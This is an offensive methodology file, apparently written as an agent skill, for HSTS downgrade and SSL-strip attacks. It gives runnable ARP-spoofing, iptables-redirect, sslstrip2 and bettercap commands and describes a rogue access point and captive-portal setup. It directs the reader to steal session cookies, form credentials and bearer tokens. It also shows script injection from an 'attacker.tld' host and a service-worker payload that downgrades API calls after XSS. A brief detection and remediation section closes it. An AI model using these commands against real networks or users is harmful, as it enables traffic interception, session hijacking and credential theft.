---
name: offensive-hsts-downgrade
description: "HSTS downgrade / SSL strip methodology when Strict-Transport-Security is missing, weak, or the domain is not on the preload list. Covers preload-list verification, max-age analysis, includeSubDomains scope, sslstrip2/bettercap workflow, captive-portal MITM, cookie hijack via downgraded first-hit, and how to test from an in-path lab setup."
---

# HSTS Downgrade / SSL Strip — Offensive Methodology

## Quick Workflow

1. Confirm HSTS state on every entry point (apex + every subdomain).
2. Check the Chromium preload list — if absent, the *first ever* navigation
   on any new device is downgradable.
3. Set up in-path MITM (ARP spoof on LAN / rogue Wi-Fi / captive portal /
   ISP-level for nation-state lab simulation).
4. Run sslstrip2 (or bettercap with `https.proxy`) to rewrite `https://` →
   `http://` in HTML/JS/Set-Cookie/Location headers.
5. Capture the first plaintext request and steal whatever flows: session
   cookies (no Secure flag), Authorization headers, form POST bodies.

---

## Detection — HSTS State

```bash
# 1. Header probe
curl -skI https://target.tld/ | grep -i strict-transport-security

# 2. Subdomain scope
curl -skI https://www.target.tld/ | grep -i strict
curl -skI https://api.target.tld/ | grep -i strict

# 3. Preload list status
curl -s 'https://hstspreload.org/api/v2/status?domain=target.tld'
```

Weak / exploitable patterns:

| HSTS state | Risk |
|---|---|
| Header absent | First-hit downgradable on every new device, every clear-cache event |
| `max-age=0` | Disables HSTS — equivalent to absent |
| `max-age < 7776000` (90 days) | Most users will lose pinning between visits |
| `includeSubDomains` absent | Subdomains downgradable even if apex is pinned |
| `preload` absent OR not submitted to hstspreload.org | First-ever connection always downgradable |
| HTTP→HTTPS 301 without HSTS on response | The 301 itself is interceptable |

---

## Lab Setup

### Wi-Fi / LAN (closest realistic scenario)

```bash
# 1. Forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. ARP-spoof victim into routing via you
sudo arpspoof -i wlan0 -t 192.168.1.55 192.168.1.1
sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.55

# 3. Redirect victim TCP/80 + 443 to local proxy
sudo iptables -t nat -A PREROUTING -p tcp --dport 80  -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

# 4. SSL strip
sudo sslstrip2 -l 8080 -w /tmp/captured.log -a
```

### Bettercap (more modern, replaces sslstrip2)

```
sudo bettercap -iface wlan0 -caplet http-req-dump
> set arp.spoof.targets 192.168.1.55
> arp.spoof on
> set http.proxy.sslstrip true
> http.proxy on
> set http.proxy.injectjs /tmp/payload.js   # optional XSS injection
```

### Captive Portal (more realistic for public attacker)

Set up a rogue AP advertising the same SSID as a legitimate venue. Victims
auto-connect. Run sslstrip2 in transparent proxy mode. Effective against any
domain not in the preload list.

---

## Exploit Primitives the Strip Unlocks

* **Session hijack via non-Secure cookie:** First downgraded HTTP request to
  any path on the host carries `Cookie: session=...` (if cookie is not
  `Secure`). Replay from a clean browser.
* **Credential capture:** Strip rewrites `<form action="https://...">` to
  HTTP. Submit body is plaintext.
* **Authorization header capture:** Mobile apps that fall back to HTTP for
  unsecured endpoints leak bearer tokens.
* **JS injection:** With sslstripping you control body content — inject
  `<script src="https://attacker.tld/payload.js">` into HTML responses for
  persistent compromise across the session.

---

## Subdomain Scope Pitfalls

Even when the apex has `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`:

* If a new subdomain (`api2.target.tld`) was added *after* preload submission,
  the preload entry doesn't help on first-hit to that subdomain unless the
  apex's `includeSubDomains` covers it AND the browser has visited the apex
  first.
* If `includeSubDomains` is absent on the apex, every subdomain is
  individually downgradable on first hit.

Test pattern:

```bash
# Enumerate subdomains, then per-subdomain HSTS check
for sub in api admin staging dev www; do
  echo "=== $sub.target.tld ==="
  curl -skI https://$sub.target.tld/ 2>/dev/null | grep -iE 'strict|location|set-cookie'
done
```

---

## Non-Network Variants

### SSL Strip via Service Worker (post-XSS)

If you already have XSS, register a service worker that intercepts every
`fetch` and rewrites HTTPS → HTTP for outgoing requests to specific endpoints.
Persistent strip with no MITM needed.

```js
// payload.js — registered via XSS as a service worker
self.addEventListener('fetch', e => {
  const u = new URL(e.request.url);
  if (u.host === 'api.target.tld' && u.protocol === 'https:') {
    u.protocol = 'http:';
    e.respondWith(fetch(u.toString()));
  }
});
```

### Mixed Content Downgrade

If the page loads any subresource over HTTP (or http://), the browser may
allow it (modern browsers block, but legacy mobile WebViews don't).

---

## Defences You Are Testing Against

* `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
* Submitted to `hstspreload.org` and accepted into the Chromium list
* Server enforces HTTPS via permanent 301 from HTTP **AND** the redirect
  response also carries HSTS (so the redirect itself isn't strippable on
  the second hit)
* `Upgrade-Insecure-Requests: 1` from clients + CSP `upgrade-insecure-requests`
* Cookie `Secure` flag on session cookies
* HSTS on every subdomain individually (defence-in-depth)

---

## Remediation (for the report)

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

Plus:

1. Submit the domain to <https://hstspreload.org>
2. Apply HSTS to every subdomain explicitly (not just via `includeSubDomains`)
3. Set `Secure` on every cookie, especially session cookies
4. Add CSP `upgrade-insecure-requests`
